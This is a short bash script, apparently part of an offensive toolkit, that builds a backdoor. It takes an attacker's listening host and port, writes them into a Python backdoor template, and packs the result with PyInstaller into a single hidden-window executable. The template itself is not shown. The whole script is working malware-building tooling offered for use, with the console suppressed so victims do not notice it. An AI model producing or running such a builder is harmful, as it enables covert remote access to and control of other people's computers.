#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "[help] ./generate_backdoor.sh <LHOST> <LPORT>"
    exit
fi

LHOST="$1"
LPORT="$2"
name="$(date '+%Y-%m-%d_%H:%M:%S')_backdoor"
sed -e 's/${LHOST}/'"\'$LHOST\'/" -e 's/${LPORT}/'"$LPORT"'/g' backdoor_template.py > backdoor.py | python3 -m PyInstaller backdoor.py --onefile --noconsole --distpath ../out --specpath /tmp --workpath /tmp --name "${name}" --exclude-module _bootlocale && rm backdoor.py

echo "[+] Backdoor generated: ../out/$name"